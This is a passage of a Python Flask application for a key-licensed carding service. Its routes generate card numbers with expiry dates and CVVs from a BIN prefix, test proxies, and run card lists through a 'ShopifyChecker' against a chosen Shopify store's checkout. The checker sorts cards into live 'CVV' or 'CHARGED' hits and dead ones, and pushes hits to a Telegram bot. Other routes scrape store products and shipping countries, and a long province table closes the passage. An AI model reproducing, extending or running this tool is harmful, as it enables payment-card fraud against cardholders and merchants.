    session["login_nonce"] = nonce_val
    resp = jsonify({"nonce": nonce_val})
    resp.set_cookie("nonce", nonce_val, httponly=False, samesite="Lax")
    return resp


@app.route("/user_info")
@require_auth
def user_info():
    key = session.get("key", "")
    now = datetime.datetime.utcnow()
    with _keys_lock:
        entry = VALID_KEYS.get(key, {})
    name = entry.get("name", "User")
    expiry = entry.get("expiry")
    if expiry:
        delta = expiry - now
        days_left = max(0, delta.days)
        hours_left = max(0, delta.seconds // 3600)
    else:
        days_left = 0
        hours_left = 0
    return jsonify(
        {
            "name": name,
            "key": key,
            "days_left": days_left,
            "hours_left": hours_left,
        }
    )


@app.route("/")
@require_auth
def index():
    return render_template("index.html")


@app.route("/generate", methods=["POST"])
@require_auth
def generate():
    data = request.json
    bin_prefix = (data.get("bin") or "").strip()
    month = (data.get("month") or "").strip()
    year = (data.get("year") or "").strip()
    cvv = (data.get("cvv") or "").strip()
    amount = int(data.get("amount") or 10)

    if not bin_prefix or len(bin_prefix) < 4:
        return jsonify({"error": "BIN must be at least 4 digits"}), 400

    amount = min(amount, 100)
    cards = []
    for _ in range(amount):
        cc = generate_card_number(bin_prefix)
        m = month if month else str(random.randint(1, 12)).zfill(2)
        y = year if year else str(random.randint(2025, 2030))
        c = cvv if cvv else "".join(random.choices(string.digits, k=3))
        cards.append(f"{cc}|{m}|{y}|{c}")

    return jsonify({"cards": cards})


@app.route("/check_proxy", methods=["POST"])
@require_auth
def check_proxy_route():
    data = request.json
    proxy_str = (data.get("proxy") or "").strip()
    if not proxy_str:
        return jsonify({"error": "No proxy provided"}), 400

    proxy = parse_proxy_string(proxy_str)
    if not proxy:
        return jsonify(
            {"error": "Invalid format — use ip:port or ip:port:user:pass"}
        ), 400

    async def test():
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(
                connector=connector, timeout=aiohttp.ClientTimeout(total=10)
            ) as session:
                async with session.get(
                    "https://api.ipify.org?format=json", proxy=proxy
                ) as resp:
                    if resp.status == 200:
                        d = await resp.json(content_type=None)
                        return True, d.get("ip", "Unknown")
                    return False, f"HTTP {resp.status}"
        except Exception as e:
            return False, str(e)[:120]

    try:
        ok, result = asyncio.run(test())
        if ok:
            return jsonify({"success": True, "ip": result})
        return jsonify({"success": False, "error": result})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)[:120]})


@app.route("/test_bot", methods=["POST"])
@require_auth
def test_bot():
    data = request.json
    bot_str = (data.get("bot") or "").strip()
    if not bot_str or "::" not in bot_str:
        return jsonify({"success": False, "error": "Format must be token::chatid"})

    token, chat_id = bot_str.split("::", 1)
    token = token.strip()
    chat_id = chat_id.strip()

    async def _test():
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(
                connector=connector, timeout=aiohttp.ClientTimeout(total=10)
            ) as session:
                # Validate token via getMe
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMe"
                ) as resp:
                    me = await resp.json(content_type=None)
                    if not me.get("ok"):
                        desc = me.get("description", "Invalid token")
                        return False, desc, None

                    username = me["result"].get("username", "")

                # Send a test message to the chat
                msg = "✅ Bot connected successfully! Hit notifications are active."
                async with session.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    json={"chat_id": chat_id, "text": msg},
                ) as resp2:
                    r2 = await resp2.json(content_type=None)
                    if not r2.get("ok"):
                        desc = r2.get(
                            "description", "Could not send message — check chat ID"
                        )
                        return False, desc, username

                return True, None, username
        except Exception as e:
            return False, str(e)[:120], None

    try:
        ok, error, username = asyncio.run(_test())
        if ok:
            return jsonify({"success": True, "username": username})
        return jsonify({"success": False, "error": error})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)[:120]})


@app.route("/check", methods=["POST"])
@require_auth
def check():
    data = request.json
    site = (data.get("site") or "").strip()
    cards_raw = (data.get("cards") or "").strip()
    proxy = (data.get("proxy") or "").strip() or None
    bot = (data.get("bot") or "").strip() or None
    ship_name = (data.get("ship_name") or "").strip() or None
    custom_address = data.get("custom_address") or None
    selected_variant = (data.get("selected_variant") or "").strip() or None

    if not site:
        return jsonify({"error": "Site URL is required"}), 400
    if not cards_raw:
        return jsonify({"error": "No cards provided"}), 400

    lines = [l.strip() for l in cards_raw.splitlines() if l.strip()]

    async def process_all():
        results = {"cvv": [], "ccn": [], "dead": []}

        for card_line in lines:
            parts = card_line.split("|")
            if len(parts) != 4:
                results["dead"].append(f"{card_line} - Invalid format")
                continue

            cc, mes, ano, cvv_val = parts
            if len(ano) == 2:
                ano = "20" + ano

            checker = ShopifyChecker()
            try:
                success, message, info = await checker.check_card(
                    site,
                    cc,
                    mes,
                    ano,
                    cvv_val,
                    proxy,
                    custom_address,
                    selected_variant,
                    ship_name,
                )
            except Exception as e:
                results["dead"].append(f"{cc}|{mes}|{ano}|{cvv_val} - Error: {str(e)}")
                continue

            card_str = f"{cc}|{mes}|{ano}|{cvv_val}"
            bin_info = {}

            if success:
                bin_info = await bin_lookup_async(cc)

            currency = (info or {}).get("currency", "")
            amount = (info or {}).get("amount", "")
            try:
                amount_fmt = f"${float(amount):.2f}" if amount else ""
            except Exception:
                amount_fmt = f"${amount}" if amount else ""

            bin_str = ""
            if bin_info:
                flag = country_flag_emoji(bin_info.get("country_code", ""))
                parts_bin = [
                    (bin_info.get("scheme") or "").upper(),
                    (bin_info.get("type") or "").upper(),
                ]
                bank = bin_info.get("bank", "")
                country_name = bin_info.get("country_name", "")
                bin_str = " | ".join(p for p in parts_bin if p)
                if bank:
                    bin_str += f" | {bank.upper()}"
                if country_name:
                    bin_str += f" | {country_name.upper()} {flag}".rstrip()

            detail = f"{card_str} - {message}"
            if amount_fmt:
                detail += f" [{amount_fmt}]"
            if bin_str:
                detail += f" ⟨{bin_str}⟩"

            if success:
                msg_lower = message.lower()
                is_cvv = any(
                    k in msg_lower for k in ["cvv", "cvc", "zip", "postal", "security"]
                )
                hit_type = "cvv" if is_cvv else "ccn"
                results[hit_type].append(detail)

                if bot:
                    status = "CVV" if is_cvv else "CHARGED"
                    await send_telegram_hit(
                        bot, card_str, status, message, info or {}, bin_info
                    )
            else:
                results["dead"].append(detail)

        return results

    try:
        results = asyncio.run(process_all())
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e), "cvv": [], "ccn": [], "dead": []}), 500


@app.route("/site_countries", methods=["POST"])
@require_auth
def site_countries():
    data = request.json
    site = (data.get("site") or "").strip()
    if not site:
        return jsonify({"error": "Site URL required"}), 400

    domain = site.replace("https://", "").replace("http://", "").strip("/")

    def _parse_country_options(html_text):
        """Parse <option value="XX">Country Name</option> from HTML."""
        matches = re.findall(
            r'<option[^>]+value="([A-Z]{2})"[^>]*>([^<]+)</option>', html_text
        )
        seen = set()
        result = []
        for code, name in matches:
            if len(code) == 2 and code not in seen:
                seen.add(code)
                result.append({"code": code, "name": name.strip()})
        return result

    def _extract_provinces(raw_countries):
        """Extract province data from a list of country dicts returned by Shopify."""
        provinces = {}
        for c in raw_countries:
            iso = c.get("iso_code", c.get("code", ""))
            provs = c.get("provinces", c.get("zones", []))
            if iso and provs:
                provinces[iso] = [
                    {
                        "code": p.get(
                            "iso_code", p.get("code", p.get("abbreviation", ""))
                        ),
                        "name": p.get("name", p.get("label", "")),
                    }
                    for p in provs
                    if p.get("iso_code") or p.get("code") or p.get("abbreviation")
                ]
        return provinces

    async def fetch():
        connector = aiohttp.TCPConnector(ssl=False)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        base_url = f"https://{domain}"

        async with aiohttp.ClientSession(
            connector=connector, timeout=aiohttp.ClientTimeout(total=20)
        ) as session:
            # --- Strategy 1: localization.json ---
            try:
                async with session.get(
                    f"{base_url}/localization.json",
                    headers={**headers, "Accept": "application/json"},
                ) as resp:
                    if resp.status == 200:
                        d = await resp.json(content_type=None)
                        countries_raw = d.get("available_countries", [])
                        if len(countries_raw) >= 1:
                            result = [
                                {
                                    "code": c.get("iso_code", ""),
                                    "name": c.get("name", ""),
                                }
                                for c in countries_raw
                                if c.get("iso_code")
                            ]
                            provinces = _extract_provinces(countries_raw)
                            if result:
                                return result, provinces
            except Exception:
                pass

            # --- Strategy 2: Embedded JSON in homepage ---
            try:
                async with session.get(
                    f"{base_url}/", headers={**headers, "Accept": "text/html"}
                ) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        m = re.search(
                            r'"available_countries"\s*:\s*(\[[\s\S]{10,5000}?\])', text
                        )
                        if m:
                            try:
                                import json as _json

                                raw = _json.loads(m.group(1))
                                result = [
                                    {
                                        "code": c.get("iso_code", c.get("code", "")),
                                        "name": c.get("name", ""),
                                    }
                                    for c in raw
                                    if c.get("iso_code") or c.get("code")
                                ]
                                provinces = _extract_provinces(raw)
                                if len(result) > 1:
                                    return result, provinces
                            except Exception:
                                pass

                        opts = _parse_country_options(text)
                        if len(opts) > 5:
                            return opts, {}
            except Exception:
                pass

            # --- Strategy 3: Add to cart → checkout HTML → parse country select ---
            try:
                checker = ShopifyChecker()
                checker.session = session
                success, product_data = await checker.fetch_products(domain)
                if success:
                    variant_id = product_data["variant_id"]
                    await session.post(
                        f"{base_url}/cart/add.js",
                        json={"id": variant_id},
                        headers=headers,
                    )
                    resp = await session.post(f"{base_url}/checkout/", headers=headers)
                    checkout_url = str(resp.url)
                    if "login" not in checkout_url.lower():
                        resp = await session.get(
                            checkout_url, headers={**headers, "Accept": "text/html"}
                        )
                        text = await resp.text()
                        m = re.search(
                            r'"available_countries"\s*:\s*(\[[\s\S]{10,10000}?\])', text
                        )
                        if m:
                            try:
                                import json as _json

                                raw = _json.loads(m.group(1))
                                result = [
                                    {
                                        "code": c.get("iso_code", c.get("code", "")),
                                        "name": c.get("name", ""),
                                    }
                                    for c in raw
                                    if c.get("iso_code") or c.get("code")
                                ]
                                provinces = _extract_provinces(raw)
                                if len(result) > 1:
                                    return result, provinces
                            except Exception:
                                pass

                        for pattern in [
                            r'"countries"\s*:\s*(\[[\s\S]{10,10000}?\])',
                            r'"availableCountries"\s*:\s*(\[[\s\S]{10,10000}?\])',
                            r'"shippingCountries"\s*:\s*(\[[\s\S]{10,10000}?\])',
                        ]:
                            m2 = re.search(pattern, text)
                            if m2:
                                try:
                                    import json as _json

                                    raw = _json.loads(m2.group(1))
                                    result = [
                                        {
                                            "code": c.get(
                                                "iso_code",
                                                c.get("code", c.get("isoCode", "")),
                                            ),
                                            "name": c.get("name", c.get("label", "")),
                                        }
                                        for c in raw
                                        if isinstance(c, dict)
                                        and (
                                            c.get("iso_code")
                                            or c.get("code")
                                            or c.get("isoCode")
                                        )
                                    ]
                                    provinces = _extract_provinces(raw)
                                    if len(result) > 1:
                                        return result, provinces
                                except Exception:
                                    pass

                        opts = _parse_country_options(text)
                        if len(opts) > 1:
                            return opts, {}
            except Exception:
                pass

        return [], {}

    try:
        countries, provinces = asyncio.run(fetch())
        return jsonify({"countries": countries, "provinces": provinces})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/site_products", methods=["POST"])
@require_auth
def site_products():
    data = request.json
    site = (data.get("site") or "").strip()
    if not site:
        return jsonify({"error": "Site URL is required"}), 400

    domain = site.replace("https://", "").replace("http://", "").strip("/")

    async def fetch():
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=20),
            headers=headers,
        ) as session:
            checker = ShopifyChecker()
            checker.session = session
            return await checker.fetch_all_products(domain)

    try:
        success, result = asyncio.run(fetch())
        if success:
            return jsonify({"products": result})
        else:
            return jsonify({"error": result}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


PROVINCES_DATA = {
    "US": [
        {"code": "AL", "name": "Alabama"},
        {"code": "AK", "name": "Alaska"},
        {"code": "AZ", "name": "Arizona"},
        {"code": "AR", "name": "Arkansas"},
        {"code": "CA", "name": "California"},
        {"code": "CO", "name": "Colorado"},
        {"code": "CT", "name": "Connecticut"},
        {"code": "DE", "name": "Delaware"},
        {"code": "FL", "name": "Florida"},
        {"code": "GA", "name": "Georgia"},
        {"code": "HI", "name": "Hawaii"},
        {"code": "ID", "name": "Idaho"},
        {"code": "IL", "name": "Illinois"},
        {"code": "IN", "name": "Indiana"},
        {"code": "IA", "name": "Iowa"},
        {"code": "KS", "name": "Kansas"},
        {"code": "KY", "name": "Kentucky"},
        {"code": "LA", "name": "Louisiana"},
        {"code": "ME", "name": "Maine"},
        {"code": "MD", "name": "Maryland"},
        {"code": "MA", "name": "Massachusetts"},
        {"code": "MI", "name": "Michigan"},
        {"code": "MN", "name": "Minnesota"},
        {"code": "MS", "name": "Mississippi"},
        {"code": "MO", "name": "Missouri"},
        {"code": "MT", "name": "Montana"},
        {"code": "NE", "name": "Nebraska"},
        {"code": "NV", "name": "Nevada"},
        {"code": "NH", "name": "New Hampshire"},
        {"code": "NJ", "name": "New Jersey"},
        {"code": "NM", "name": "New Mexico"},
        {"code": "NY", "name": "New York"},
        {"code": "NC", "name": "North Carolina"},
        {"code": "ND", "name": "North Dakota"},
        {"code": "OH", "name": "Ohio"},
        {"code": "OK", "name": "Oklahoma"},
        {"code": "OR", "name": "Oregon"},
        {"code": "PA", "name": "Pennsylvania"},
        {"code": "RI", "name": "Rhode Island"},
        {"code": "SC", "name": "South Carolina"},
        {"code": "SD", "name": "South Dakota"},
        {"code": "TN", "name": "Tennessee"},
        {"code": "TX", "name": "Texas"},
        {"code": "UT", "name": "Utah"},
        {"code": "VT", "name": "Vermont"},
        {"code": "VA", "name": "Virginia"},
        {"code": "WA", "name": "Washington"},
        {"code": "WV", "name": "West Virginia"},
        {"code": "WI", "name": "Wisconsin"},
        {"code": "WY", "name": "Wyoming"},
        {"code": "DC", "name": "Washington D.C."},
        {"code": "AS", "name": "American Samoa"},
        {"code": "GU", "name": "Guam"},
        {"code": "PR", "name": "Puerto Rico"},
        {"code": "VI", "name": "U.S. Virgin Islands"},
    ],
    "CA": [
        {"code": "AB", "name": "Alberta"},
        {"code": "BC", "name": "British Columbia"},
        {"code": "MB", "name": "Manitoba"},
        {"code": "NB", "name": "New Brunswick"},
        {"code": "NL", "name": "Newfoundland and Labrador"},
        {"code": "NS", "name": "Nova Scotia"},
        {"code": "NT", "name": "Northwest Territories"},
        {"code": "NU", "name": "Nunavut"},
        {"code": "ON", "name": "Ontario"},
        {"code": "PE", "name": "Prince Edward Island"},
        {"code": "QC", "name": "Quebec"},
        {"code": "SK", "name": "Saskatchewan"},
        {"code": "YT", "name": "Yukon"},
    ],
    "AU": [
        {"code": "ACT", "name": "Australian Capital Territory"},
        {"code": "NSW", "name": "New South Wales"},
        {"code": "NT", "name": "Northern Territory"},
        {"code": "QLD", "name": "Queensland"},
        {"code": "SA", "name": "South Australia"},
        {"code": "TAS", "name": "Tasmania"},
        {"code": "VIC", "name": "Victoria"},
        {"code": "WA", "name": "Western Australia"},
    ],
    "GB": [
        {"code": "ENG", "name": "England"},
        {"code": "NIR", "name": "Northern Ireland"},
        {"code": "SCT", "name": "Scotland"},
        {"code": "WLS", "name": "Wales"},
    ],
    "MX": [
        {"code": "AG", "name": "Aguascalientes"},
        {"code": "BC", "name": "Baja California"},
        {"code": "BS", "name": "Baja California Sur"},
        {"code": "CM", "name": "Campeche"},
        {"code": "CS", "name": "Chiapas"},
        {"code": "CH", "name": "Chihuahua"},
        {"code": "CO", "name": "Coahuila"},
        {"code": "CL", "name": "Colima"},
        {"code": "DF", "name": "Ciudad de Mexico"},
        {"code": "DG", "name": "Durango"},
        {"code": "GT", "name": "Guanajuato"},
        {"code": "GR", "name": "Guerrero"},
        {"code": "HG", "name": "Hidalgo"},
        {"code": "JA", "name": "Jalisco"},
        {"code": "EM", "name": "Estado de Mexico"},
        {"code": "MI", "name": "Michoacan"},
        {"code": "MO", "name": "Morelos"},
        {"code": "NA", "name": "Nayarit"},
        {"code": "NL", "name": "Nuevo Leon"},
        {"code": "OA", "name": "Oaxaca"},
        {"code": "PU", "name": "Puebla"},
        {"code": "QT", "name": "Queretaro"},
        {"code": "QR", "name": "Quintana Roo"},
        {"code": "SL", "name": "San Luis Potosi"},
        {"code": "SI", "name": "Sinaloa"},
        {"code": "SO", "name": "Sonora"},
        {"code": "TB", "name": "Tabasco"},
        {"code": "TM", "name": "Tamaulipas"},
        {"code": "TL", "name": "Tlaxcala"},
        {"code": "VE", "name": "Veracruz"},
        {"code": "YU", "name": "Yucatan"},
        {"code": "ZA", "name": "Zacatecas"},
    ],
    "BR": [
        {"code": "AC", "name": "Acre"},
        {"code": "AL", "name": "Alagoas"},
        {"code": "AP", "name": "Amapa"},
        {"code": "AM", "name": "Amazonas"},
        {"code": "BA", "name": "Bahia"},
        {"code": "CE", "name": "Ceara"},
        {"code": "DF", "name": "Distrito Federal"},
        {"code": "ES", "name": "Espirito Santo"},
        {"code": "GO", "name": "Goias"},
        {"code": "MA", "name": "Maranhao"},
        {"code": "MT", "name": "Mato Grosso"},
        {"code": "MS", "name": "Mato Grosso do Sul"},
        {"code": "MG", "name": "Minas Gerais"},
        {"code": "PA", "name": "Para"},
        {"code": "PB", "name": "Paraiba"},
        {"code": "PR", "name": "Parana"},
        {"code": "PE", "name": "Pernambuco"},
        {"code": "PI", "name": "Piaui"},
        {"code": "RJ", "name": "Rio de Janeiro"},
        {"code": "RN", "name": "Rio Grande do Norte"},
        {"code": "RS", "name": "Rio Grande do Sul"},
        {"code": "RO", "name": "Rondonia"},
        {"code": "RR", "name": "Roraima"},
        {"code": "SC", "name": "Santa Catarina"},
        {"code": "SP", "name": "Sao Paulo"},
        {"code": "SE", "name": "Sergipe"},
        {"code": "TO", "name": "Tocantins"},
    ],
    "IN": [
        {"code": "AN", "name": "Andaman and Nicobar Islands"},
        {"code": "AP", "name": "Andhra Pradesh"},
        {"code": "AR", "name": "Arunachal Pradesh"},
        {"code": "AS", "name": "Assam"},
        {"code": "BR", "name": "Bihar"},
        {"code": "CH", "name": "Chandigarh"},
        {"code": "CG", "name": "Chhattisgarh"},
        {"code": "DD", "name": "Dadra and Nagar Haveli and Daman and Diu"},
        {"code": "DL", "name": "Delhi"},
        {"code": "GA", "name": "Goa"},
        {"code": "GJ", "name": "Gujarat"},
        {"code": "HR", "name": "Haryana"},
        {"code": "HP", "name": "Himachal Pradesh"},
        {"code": "JK", "name": "Jammu and Kashmir"},
        {"code": "JH", "name": "Jharkhand"},
        {"code": "KA", "name": "Karnataka"},
        {"code": "KL", "name": "Kerala"},
        {"code": "LA", "name": "Ladakh"},
        {"code": "LD", "name": "Lakshadweep"},
        {"code": "MP", "name": "Madhya Pradesh"},
        {"code": "MH", "name": "Maharashtra"},
        {"code": "MN", "name": "Manipur"},
        {"code": "ML", "name": "Meghalaya"},
        {"code": "MZ", "name": "Mizoram"},
        {"code": "NL", "name": "Nagaland"},
        {"code": "OR", "name": "Odisha"},
        {"code": "PY", "name": "Puducherry"},
        {"code": "PB", "name": "Punjab"},
        {"code": "RJ", "name": "Rajasthan"},
        {"code": "SK", "name": "Sikkim"},
        {"code": "TN", "name": "Tamil Nadu"},
        {"code": "TS", "name": "Telangana"},
        {"code": "TR", "name": "Tripura"},
        {"code": "UP", "name": "Uttar Pradesh"},
        {"code": "UK", "name": "Uttarakhand"},
        {"code": "WB", "name": "West Bengal"},
    ],
    "DE": [
        {"code": "BB", "name": "Brandenburg"},
        {"code": "BE", "name": "Berlin"},
        {"code": "BW", "name": "Baden-Wuerttemberg"},
        {"code": "BY", "name": "Bavaria"},
        {"code": "HB", "name": "Bremen"},
        {"code": "HE", "name": "Hesse"},
        {"code": "HH", "name": "Hamburg"},
        {"code": "MV", "name": "Mecklenburg-Vorpommern"},
        {"code": "NI", "name": "Lower Saxony"},
        {"code": "NW", "name": "North Rhine-Westphalia"},
        {"code": "RP", "name": "Rhineland-Palatinate"},
        {"code": "SH", "name": "Schleswig-Holstein"},
        {"code": "SL", "name": "Saarland"},
        {"code": "SN", "name": "Saxony"},
        {"code": "ST", "name": "Saxony-Anhalt"},
        {"code": "TH", "name": "Thuringia"},
    ],
    "IT": [
        {"code": "AG", "name": "Agrigento"},
        {"code": "AL", "name": "Alessandria"},
        {"code": "AN", "name": "Ancona"},
        {"code": "AO", "name": "Aosta"},
        {"code": "AP", "name": "Ascoli Piceno"},
        {"code": "AQ", "name": "L'Aquila"},
        {"code": "AR", "name": "Arezzo"},
        {"code": "AT", "name": "Asti"},
        {"code": "AV", "name": "Avellino"},
        {"code": "BA", "name": "Bari"},
        {"code": "BG", "name": "Bergamo"},
        {"code": "BI", "name": "Biella"},
        {"code": "BL", "name": "Belluno"},
        {"code": "BN", "name": "Benevento"},
        {"code": "BO", "name": "Bologna"},
        {"code": "BR", "name": "Brindisi"},
        {"code": "BS", "name": "Brescia"},
        {"code": "BT", "name": "Barletta-Andria-Trani"},
        {"code": "BZ", "name": "Bolzano"},
        {"code": "CA", "name": "Cagliari"},
        {"code": "CB", "name": "Campobasso"},
        {"code": "CE", "name": "Caserta"},
        {"code": "CH", "name": "Chieti"},
        {"code": "CL", "name": "Caltanissetta"},
        {"code": "CN", "name": "Cuneo"},
        {"code": "CO", "name": "Como"},
        {"code": "CR", "name": "Cremona"},
        {"code": "CS", "name": "Cosenza"},
        {"code": "CT", "name": "Catania"},
        {"code": "CZ", "name": "Catanzaro"},
        {"code": "EN", "name": "Enna"},
        {"code": "FC", "name": "Forli-Cesena"},
        {"code": "FE", "name": "Ferrara"},
        {"code": "FG", "name": "Foggia"},
        {"code": "FI", "name": "Florence"},
        {"code": "FM", "name": "Fermo"},
        {"code": "FR", "name": "Frosinone"},
        {"code": "GE", "name": "Genoa"},
        {"code": "GO", "name": "Gorizia"},
        {"code": "GR", "name": "Grosseto"},
        {"code": "IM", "name": "Imperia"},
        {"code": "IS", "name": "Isernia"},
        {"code": "KR", "name": "Crotone"},
        {"code": "LC", "name": "Lecco"},
        {"code": "LE", "name": "Lecce"},
        {"code": "LI", "name": "Livorno"},
        {"code": "LO", "name": "Lodi"},
        {"code": "LT", "name": "Latina"},
        {"code": "LU", "name": "Lucca"},
        {"code": "MB", "name": "Monza e Brianza"},
        {"code": "MC", "name": "Macerata"},
        {"code": "ME", "name": "Messina"},
        {"code": "MI", "name": "Milan"},
        {"code": "MN", "name": "Mantua"},
        {"code": "MO", "name": "Modena"},
        {"code": "MS", "name": "Massa-Carrara"},
        {"code": "MT", "name": "Matera"},
        {"code": "NA", "name": "Naples"},
        {"code": "NO", "name": "Novara"},
        {"code": "NU", "name": "Nuoro"},
        {"code": "OR", "name": "Oristano"},
        {"code": "PA", "name": "Palermo"},
        {"code": "PC", "name": "Piacenza"},
        {"code": "PD", "name": "Padua"},
        {"code": "PE", "name": "Pescara"},
        {"code": "PG", "name": "Perugia"},
        {"code": "PI", "name": "Pisa"},
        {"code": "PN", "name": "Pordenone"},
        {"code": "PO", "name": "Prato"},
        {"code": "PT", "name": "Pistoia"},
        {"code": "PU", "name": "Pesaro e Urbino"},
        {"code": "PV", "name": "Pavia"},
        {"code": "PZ", "name": "Potenza"},
        {"code": "RA", "name": "Ravenna"},
        {"code": "RC", "name": "Reggio Calabria"},
        {"code": "RE", "name": "Reggio Emilia"},
        {"code": "RG", "name": "Ragusa"},
        {"code": "RI", "name": "Rieti"},
        {"code": "RM", "name": "Rome"},
        {"code": "RN", "name": "Rimini"},
        {"code": "RO", "name": "Rovigo"},
        {"code": "SA", "name": "Salerno"},
        {"code": "SI", "name": "Siena"},
        {"code": "SO", "name": "Sondrio"},
        {"code": "SP", "name": "La Spezia"},
        {"code": "SR", "name": "Syracuse"},
        {"code": "SS", "name": "Sassari"},
        {"code": "SU", "name": "South Sardinia"},
        {"code": "SV", "name": "Savona"},
        {"code": "TA", "name": "Taranto"},
        {"code": "TE", "name": "Teramo"},
        {"code": "TN", "name": "Trento"},
        {"code": "TO", "name": "Turin"},
        {"code": "TP", "name": "Trapani"},
        {"code": "TR", "name": "Terni"},
        {"code": "TS", "name": "Trieste"},
        {"code": "TV", "name": "Treviso"},
        {"code": "UD", "name": "Udine"},
        {"code": "VA", "name": "Varese"},
        {"code": "VB", "name": "Verbano-Cusio-Ossola"},
        {"code": "VC", "name": "Vercelli"},
        {"code": "VE", "name": "Venice"},
        {"code": "VI", "name": "Vicenza"},
        {"code": "VR", "name": "Verona"},
        {"code": "VT", "name": "Viterbo"},
        {"code": "VV", "name": "Vibo Valentia"},
    ],
    "ES": [
        {"code": "AN", "name": "Andalusia"},
        {"code": "AR", "name": "Aragon"},
        {"code": "AS", "name": "Asturias"},
        {"code": "CB", "name": "Cantabria"},
        {"code": "CE", "name": "Ceuta"},
        {"code": "CL", "name": "Castile and Leon"},
        {"code": "CM", "name": "Castilla-La Mancha"},
        {"code": "CN", "name": "Canary Islands"},
        {"code": "CT", "name": "Catalonia"},
        {"code": "EX", "name": "Extremadura"},
        {"code": "GA", "name": "Galicia"},
        {"code": "IB", "name": "Balearic Islands"},
        {"code": "LO", "name": "La Rioja"},
        {"code": "MD", "name": "Community of Madrid"},
        {"code": "ME", "name": "Melilla"},
        {"code": "MU", "name": "Region of Murcia"},
        {"code": "NC", "name": "Chartered Community of Navarre"},
        {"code": "PV", "name": "Basque Country"},
        {"code": "VC", "name": "Valencian Community"},
    ],
    "FR": [
        {"code": "ARA", "name": "Auvergne-Rhone-Alpes"},
        {"code": "BFC", "name": "Bourgogne-Franche-Comte"},
        {"code": "BRE", "name": "Brittany"},
        {"code": "CVL", "name": "Centre-Val de Loire"},
        {"code": "COR", "name": "Corsica"},
        {"code": "GES", "name": "Grand Est"},
        {"code": "GUA", "name": "Guadeloupe"},
        {"code": "GUY", "name": "French Guiana"},
        {"code": "HDF", "name": "Hauts-de-France"},
        {"code": "IDF", "name": "Ile-de-France"},
        {"code": "LRE", "name": "Reunion"},
        {"code": "MAR", "name": "Martinique"},
        {"code": "MAY", "name": "Mayotte"},
        {"code": "NAQ", "name": "Nouvelle-Aquitaine"},
        {"code": "NOR", "name": "Normandy"},
        {"code": "OCC", "name": "Occitanie"},
        {"code": "PDL", "name": "Pays de la Loire"},
        {"code": "PAC", "name": "Provence-Alpes-Cote d'Azur"},
    ],
    "JP": [
        {"code": "JP-01", "name": "Hokkaido"},
        {"code": "JP-02", "name": "Aomori"},
        {"code": "JP-03", "name": "Iwate"},
        {"code": "JP-04", "name": "Miyagi"},
        {"code": "JP-05", "name": "Akita"},
        {"code": "JP-06", "name": "Yamagata"},
        {"code": "JP-07", "name": "Fukushima"},
        {"code": "JP-08", "name": "Ibaraki"},
        {"code": "JP-09", "name": "Tochigi"},
        {"code": "JP-10", "name": "Gunma"},
        {"code": "JP-11", "name": "Saitama"},
        {"code": "JP-12", "name": "Chiba"},
        {"code": "JP-13", "name": "Tokyo"},
        {"code": "JP-14", "name": "Kanagawa"},
        {"code": "JP-15", "name": "Niigata"},
        {"code": "JP-16", "name": "Toyama"},
        {"code": "JP-17", "name": "Ishikawa"},
        {"code": "JP-18", "name": "Fukui"},
        {"code": "JP-19", "name": "Yamanashi"},
        {"code": "JP-20", "name": "Nagano"},
        {"code": "JP-21", "name": "Gifu"},
        {"code": "JP-22", "name": "Shizuoka"},
        {"code": "JP-23", "name": "Aichi"},
        {"code": "JP-24", "name": "Mie"},
        {"code": "JP-25", "name": "Shiga"},
        {"code": "JP-26", "name": "Kyoto"},
        {"code": "JP-27", "name": "Osaka"},
        {"code": "JP-28", "name": "Hyogo"},
        {"code": "JP-29", "name": "Nara"},
        {"code": "JP-30", "name": "Wakayama"},
        {"code": "JP-31", "name": "Tottori"},
        {"code": "JP-32", "name": "Shimane"},
        {"code": "JP-33", "name": "Okayama"},
        {"code": "JP-34", "name": "Hiroshima"},
        {"code": "JP-35", "name": "Yamaguchi"},
        {"code": "JP-36", "name": "Tokushima"},
        {"code": "JP-37", "name": "Kagawa"},
        {"code": "JP-38", "name": "Ehime"},
        {"code": "JP-39", "name": "Kochi"},
        {"code": "JP-40", "name": "Fukuoka"},
        {"code": "JP-41", "name": "Saga"},
        {"code": "JP-42", "name": "Nagasaki"},
        {"code": "JP-43", "name": "Kumamoto"},
        {"code": "JP-44", "name": "Oita"},
        {"code": "JP-45", "name": "Miyazaki"},
        {"code": "JP-46", "name": "Kagoshima"},
        {"code": "JP-47", "name": "Okinawa"},
    ],
    "ZA": [
        {"code": "EC", "name": "Eastern Cape"},
        {"code": "FS", "name": "Free State"},
        {"code": "GP", "name": "Gauteng"},
        {"code": "KZN", "name": "KwaZulu-Natal"},
        {"code": "LP", "name": "Limpopo"},
        {"code": "MP", "name": "Mpumalanga"},
        {"code": "NC", "name": "Northern Cape"},
        {"code": "NW", "name": "North West"},
        {"code": "WC", "name": "Western Cape"},
    ],
    "NZ": [
        {"code": "AUK", "name": "Auckland"},
        {"code": "BOP", "name": "Bay of Plenty"},
        {"code": "CAN", "name": "Canterbury"},
        {"code": "GIS", "name": "Gisborne"},
        {"code": "HKB", "name": "Hawke's Bay"},
        {"code": "MBH", "name": "Marlborough"},
        {"code": "MWT", "name": "Manawatu-Wanganui"},
        {"code": "NSN", "name": "Nelson"},
        {"code": "NTL", "name": "Northland"},
        {"code": "OTA", "name": "Otago"},
        {"code": "STL", "name": "Southland"},
        {"code": "TAS", "name": "Tasman"},
